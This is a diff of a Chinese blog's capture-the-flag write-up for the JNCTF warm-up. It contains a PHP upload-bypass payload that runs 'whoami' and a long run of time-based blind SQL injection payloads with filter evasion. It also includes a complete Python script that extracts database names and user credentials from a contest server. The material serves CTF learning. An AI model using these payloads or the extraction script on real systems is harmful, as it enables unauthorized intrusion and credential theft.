@@ -24,19 +24,22 @@
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
 
-    <meta name="description" content="JNCTF 热身赛 WPno_sleep过滤了sleep，空格，+   可以确定是SQL注入，判断数据库版本 1&#x27;&#x2F;**&#x2F;OR&#x2F;**&#x2F;BENCHMARK(1000000,MD5(&#x27;test&#x27;))&#x2F;**&#x2F;#  成功转圈 1&#x27;OR&#x2F;**&#x2F;IF(1&#x3D;1,BENCHMARK(500000000,MD5(&#x27;test&#x27;)),0)&#x2F;**&#x2F;  忘记写注释">
+    <meta name="description" content="JNCTF 热身赛 WPupload过滤：php， {[(\log 只要GIF（Content-Type: image&#x2F;gif就行了） 1&lt;?PhP $a &#x3D; &#x27;whoami&#x27;; echo &#96;$a&#96;; ?&gt;  原神启动        back_block.-. –… ..– – ..-. …- –… ..— ..- -.- -…. .– -. — ..–">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JNCTF 热身赛 WP">
 <meta property="og:url" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/index.html">
 <meta property="og:site_name" content="CTF学习笔记">
-<meta property="og:description" content="JNCTF 热身赛 WPno_sleep过滤了sleep，空格，+   可以确定是SQL注入，判断数据库版本 1&#x27;&#x2F;**&#x2F;OR&#x2F;**&#x2F;BENCHMARK(1000000,MD5(&#x27;test&#x27;))&#x2F;**&#x2F;#  成功转圈 1&#x27;OR&#x2F;**&#x2F;IF(1&#x3D;1,BENCHMARK(500000000,MD5(&#x27;test&#x27;)),0)&#x2F;**&#x2F;  忘记写注释">
+<meta property="og:description" content="JNCTF 热身赛 WPupload过滤：php， {[(\log 只要GIF（Content-Type: image&#x2F;gif就行了） 1&lt;?PhP $a &#x3D; &#x27;whoami&#x27;; echo &#96;$a&#96;; ?&gt;  原神启动        back_block.-. –… ..– – ..-. …- –… ..— ..- -.- -…. .– -. — ..–">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/E73EB5F2AB3A0A8D4250CADF99E0BEF4.png">
+<meta property="og:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/2D3C6BD6F2C8FFC254EB8CC6FEC50CD8.png">
 <meta property="og:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png">
+<meta property="og:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/E1484AC604DD5E858CB41D2909D1F810.png">
 <meta property="article:published_time" content="2025-03-16T10:44:45.000Z">
-<meta property="article:modified_time" content="2025-03-16T12:33:31.454Z">
+<meta property="article:modified_time" content="2025-03-18T12:46:49.025Z">
 <meta property="article:author" content="温柔刀">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png">
+<meta name="twitter:image" content="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/E73EB5F2AB3A0A8D4250CADF99E0BEF4.png">
 
 
 <link rel="canonical" href="http://example.com/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/">
@@ -119,7 +122,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP"><span class="nav-number">1.</span> <span class="nav-text">JNCTF 热身赛 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#no-sleep"><span class="nav-number">1.1.</span> <span class="nav-text">no_sleep</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP"><span class="nav-number">1.</span> <span class="nav-text">JNCTF 热身赛 WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-number">1.1.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%A5%9E%E5%90%AF%E5%8A%A8"><span class="nav-number">1.2.</span> <span class="nav-text">原神启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#back-block"><span class="nav-number">1.3.</span> <span class="nav-text">back_block</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#no-sleep"><span class="nav-number">1.4.</span> <span class="nav-text">no_sleep</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.4.1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%9A"><span class="nav-number">1.4.2.</span> <span class="nav-text">题外话：</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -206,9 +209,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-16 18:44:45 / 修改时间：20:33:31" itemprop="dateCreated datePublished" datetime="2025-03-16T18:44:45+08:00">2025-03-16</time>
+      <time title="创建时间：2025-03-16 18:44:45" itemprop="dateCreated datePublished" datetime="2025-03-16T18:44:45+08:00">2025-03-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-18 20:46:49" itemprop="dateModified" datetime="2025-03-18T20:46:49+08:00">2025-03-18</time>
     </span>
 
   
@@ -232,14 +241,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>418</span>
+      <span>2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>7 分钟</span>
     </span>
 </div>
 
@@ -249,7 +258,23 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="JNCTF-热身赛-WP"><a href="#JNCTF-热身赛-WP" class="headerlink" title="JNCTF 热身赛 WP"></a>JNCTF 热身赛 WP</h1><h2 id="no-sleep"><a href="#no-sleep" class="headerlink" title="no_sleep"></a>no_sleep</h2><p>过滤了sleep，空格，+</p>
+    <div class="post-body" itemprop="articleBody"><h1 id="JNCTF-热身赛-WP"><a href="#JNCTF-热身赛-WP" class="headerlink" title="JNCTF 热身赛 WP"></a>JNCTF 热身赛 WP</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>过滤：php， {[(\log</p>
+<p>只要GIF（Content-Type: image&#x2F;gif就行了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PhP $a = &#x27;whoami&#x27;; echo `$a`; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h2><img src="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/E73EB5F2AB3A0A8D4250CADF99E0BEF4.png" class="" title="E73EB5F2AB3A0A8D4250CADF99E0BEF4">
+
+
+
+
+
+<img src="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/2D3C6BD6F2C8FFC254EB8CC6FEC50CD8.png" class="" title="2D3C6BD6F2C8FFC254EB8CC6FEC50CD8">
+
+<h2 id="back-block"><a href="#back-block" class="headerlink" title="back_block"></a>back_block</h2><p>.-. –… ..– – ..-. …- –… ..— ..- -.- -…. .– -. — ..– .- –… …– .-.. —. .—-. —– … – ….. — .-.- .—- …</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">R7ZMLB38DK-4GAOZN37FJ-E10SM5OC9S</span><br><span class="line">S9CO5MS01EJF73NZOAG4KD83BLMZ7R</span><br><span class="line">S9CO5MS01E-JF73NZOAG4-KD83BLMZ3R</span><br><span class="line">s9co5ms01e-jf73nzOag4-kd83blmz3r</span><br><span class="line">1234567890 1234567890 1234567890</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>s9co5ms01-ejf73nzoag4-kd83blmz3r</p>
+<h2 id="no-sleep"><a href="#no-sleep" class="headerlink" title="no_sleep"></a>no_sleep</h2><p>过滤了sleep，空格，+,select,explain</p>
 <img src="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/QQ20250316-184507.png" class="" title="QQ20250316-184507">
 
 <p>可以确定是SQL注入，判断数据库版本</p>
@@ -272,7 +297,93 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#x27;CHARACTER_SETS&#x27;/**/LIMIT/**/1),1,1))=&#123;ascii_value&#125;,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br></pre></td></tr></table></figure>
 
 <p>CHARACTER_SET_NAME</p>
+<p>C</p>
 <p>1 2 3456789012345678</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/CHARACTER_SET_NAME/**/FROM/**/CHARACTER_SETS/**/LIMIT/**/1),1,1))=124,0,BENCHMARK(10000000000,MD5(&#x27;test&#x27;)))/**/#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#x27;/**/OR/**/IF(1=1,BENCHMARK(1000000,MD5(CONCAT(&#x27;Test:&#x27;,(SELECT/**/1)))),0)/**/#&amp;pw=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/CHARACTER_SET_NAME/**/FROM/**/CHARACTER_SETS/**/LIMIT/**/1),1,1))=1,0,BENCHMARK(100000000000,MD5(&#x27;test&#x27;)))/**/#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF((SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#x27;CHARACTER_SETS&#x27;)=1,0,BENCHMARK(1000000000,MD5(&#x27;test&#x27;)))/**/# 延迟大</span><br></pre></td></tr></table></figure>
+
+<p>发现有两个列…</p>
+<p>发现第一个列是空的…</p>
+<p>发现自己语法写错了…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#x27;CHARACTER_SETS&#x27;/**/LIMIT/**/1/**/OFFSET/**/1),1,1))=&#123;ascii_value&#125;,BENCHMARK(300000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第二个列DEFAULT_COLLATE_NAME</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/DEFAULT/**/FROM/**/CHARACTER_SETS/**/LIMIT/**/1),1,1))=&#123;ascii_value&#125;,BENCHMARK(500000,MD5(&#x27;test&#x27;)),0)/**/#</span><br></pre></td></tr></table></figure>
+
+<p>没用的payload</p>
+<p>测有没有第三个列DESCRIPTION</p>
+<p>测有没有第四个列MAXLEN</p>
+<p>没有第五个列</p>
+<p>这几个列貌似都是空的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF((SELECT/**/COUNT(*)/**/FROM/**/information_schema.schemata/**/LIMIT/**/1,1)&gt;1,0,BENCHMARK(10000000000,MD5(&#x27;test&#x27;)))/**/# 延迟大 一个库</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF((SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=&#x27;sql&#x27;/**/LIMIT/**/1,1)&gt;1,0,BENCHMARK(1000000,MD5(&#x27;test&#x27;)))/**/# 延迟大 一个表</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(TABLE_SCHEMA,&#x27;:&#x27;,TABLE_NAME)/**/FROM/**/information_schema.tables),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(900000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line">information_schemaDCHARACTER_SETS</span><br><span class="line">12345678901234567890123456</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(COLUMN_NAME)/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_NAME=&#x27;CHARACTER_SETS&#x27;),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(5000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line"></span><br><span class="line">第十九个字符莫名其妙查询不到</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(SCHEMA_NAME/**/SEPARATOR&#x27;&#x27;)/**/FROM/**/information_schema.schemata),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(5000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line">最终匹配的结果: </span><br><span class="line"></span><br><span class="line">information_schemamysqlperformance_schemascore_mbamissionscore_minnesotaunitedsql</span><br><span class="line">123456789012345678</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(TABLE_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(3000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>库：sql</p>
+<p>表：users </p>
+<p>列：id(1,2,3,4,5) </p>
+<p>列：username,’,’,password,’,’,gender</p>
+<p>数据：aa,aaaa,232,bb,bbbb,115,cc,cccc,123,admin,123456,235</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(id)/**/FROM/**/sql.users),1,1))=1,0,BENCHMARK(3000000,MD5(&#x27;test&#x27;)))/**/# 延迟很大 说明这个语句是对的</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>库：mysql  </p>
+<p>表：word help_relation help_topic (没报完，从92继续开始爆破)</p>
+<p>库：performance_schema </p>
+<p>库：score_mbamission</p>
+<p>库：score_minnesotaunited </p>
+<p>表：billinggroup billingitem content counters crmgroup crmitem dictionary dictionary_group doc_mng goods inventory inventoryelement inventoryelementrecord mediaspendgroup mediaspenditem partner pp_billing products schemaversion settings user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 列：itemId roupId partnPrId itemName updateDate updatedBy active elementId itemId partnerId department itemName itemName （没爆完 从110开始爆）</span><br><span class="line">1234567890123467890123456789012345678901234</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(TABLE_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;),1&#125;,1))=1,0,BENCHMARK(3000000,MD5(&#x27;test&#x27;)))/**/#</span><br><span class="line">延迟很大，说明</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(LENGTH((SELECT/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;))&gt;1,0,BENCHMARK(3000000,MD5(&#x27;test&#x27;)))/**/#</span><br><span class="line">延迟很小</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;),1,1))=1,0,BENCHMARK(3000000,MD5(&#x27;test&#x27;)))/**/# 延迟很大</span><br></pre></td></tr></table></figure>
+
+<p>你可以使用以下 Payload 来获取 <code>score_minnesotaunited</code> 库中所有表的列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(3000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>库：?</p>
+<p>表：CHARACTER_SET_NAME DEFAULT_COLLATE_NAME DESCRIPTION MAXLEN</p>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://172.18.137.75:32202/search.php&quot;</span><br><span class="line"></span><br><span class="line"># 请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;172.18.137.75:32202&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://172.18.137.75:32202&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://172.18.137.75:30498/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 初始化结果字符串和字符位置</span><br><span class="line">final_name = &quot;&quot;  # 用于存储最终结果（所有找到的字符）</span><br><span class="line">position = 55</span><br><span class="line"># 从第 19 个字符位置开始查找</span><br><span class="line"></span><br><span class="line"># 遍历 position 的每个位置</span><br><span class="line">while True:</span><br><span class="line">    found_char = False  # 用于标记当前position是否找到了字符</span><br><span class="line"></span><br><span class="line">    # 遍历 ASCII 码范围（65 到 127）</span><br><span class="line">    for ascii_value in range(32, 128):</span><br><span class="line">        # 动态构造 Payload</span><br><span class="line">        # payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(TABLE_SCHEMA,&#x27;:&#x27;,TABLE_NAME)/**/FROM/**/information_schema.tables),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(1000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line">        # payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR&#x27;,&#x27;)/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA=&#x27;score_minnesotaunited&#x27;),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(3000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line">        # 查username,&#x27;,&#x27;,password,&#x27;,&#x27;,gender里的数据</span><br><span class="line">        payload = f&quot;&#x27;/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/GROUP_CONCAT(username,&#x27;,&#x27;,password,&#x27;,&#x27;,gender)/**/FROM/**/sql.users),&#123;position&#125;,1))=&#123;ascii_value&#125;,BENCHMARK(3000000,MD5(&#x27;test&#x27;)),0)/**/#&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 请求体</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;name&quot;: payload,</span><br><span class="line">            &quot;pw&quot;: &quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发送 POST 请求</span><br><span class="line">        try:</span><br><span class="line">            start_time = time.time()  # 记录请求开始时间</span><br><span class="line">            response = requests.post(url, headers=headers, data=data, timeout=100)  # 设置超时为 30 秒</span><br><span class="line">            end_time = time.time()  # 记录请求结束时间</span><br><span class="line"></span><br><span class="line">            response_time = end_time - start_time  # 计算响应时间</span><br><span class="line">            print(</span><br><span class="line">                f&quot;测试位置: &#123;position&#125;, ASCII 值: &#123;ascii_value&#125; (&#123;chr(ascii_value)&#125;), 响应时间: &#123;response_time:.2f&#125; 秒&quot;)</span><br><span class="line"></span><br><span class="line">            if response_time &gt; 3 :  # 如果响应时间大于 3 秒</span><br><span class="line">                print(f&quot;OK: 字符匹配，位置 &#123;position&#125;, 字符 &#123;chr(ascii_value)&#125;&quot;)</span><br><span class="line">                final_name += chr(ascii_value)  # 将匹配的字符添加到最终结果中</span><br><span class="line"></span><br><span class="line">                found_char = True  # 标记当前 position 找到了匹配字符</span><br><span class="line">                break  # 找到字符后立即跳出当前的循环，继续下一个位置</span><br><span class="line"></span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(f&quot;请求失败 (字符位置: &#123;position&#125;, ASCII 值: &#123;ascii_value&#125;):&quot;, e)</span><br><span class="line"></span><br><span class="line">    if not found_char:  # 如果对当前 position 遍历完所有字符都没有找到，终止查找</span><br><span class="line">        print(f&quot;没有在位置 &#123;position&#125; 找到匹配字符，停止查找。&quot;)</span><br><span class="line">        break  # 没有匹配字符，跳出外层 while 循环</span><br><span class="line"></span><br><span class="line">    position += 1  # 增加位置，查找下一个位置的字符</span><br><span class="line"></span><br><span class="line"># 输出最终匹配的结果</span><br><span class="line">if final_name:</span><br><span class="line">    print(f&quot;最终匹配的结果: &#123;final_name&#125;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;没有找到匹配的字符。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/03/16/JNCTF-%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/E1484AC604DD5E858CB41D2909D1F810.png" class="" title="E1484AC604DD5E858CB41D2909D1F810">
+
+<h3 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h3><p>做这个题的耗时整整两天，完全超出正常比赛，但是确实标志着我是有能力做出和很难的一道题的。</p>
+<p>周末开热身赛之后，点一个题，不会，下一个。不会，下一个…怎么没题了？</p>
+<p>正式比赛也是这样，爆零时间多了，心态就崩了，就开始问别人：一开始爆零正常吗？怎么才能不爆零？</p>
+<p>床上翻来覆去的想，为什么别人能做出来，我做不出来？no_sleep这道题我知道是sql注入，知道过滤了sleep用benchmark，我为什么还是做不出来？为什么为什么为什么？</p>
+<p>其实做这道题有很多阻碍，比如跑着跑着脚本忽然环境到期了，还比如还差一点就拿到flag的时候由于我要赶着上晚自习，把电脑合上，wifi断了，所以脚本结果错了。</p>
+<p>也有很多部分是在AI的帮助，脚本和payload基本都是GPT写的。</p>
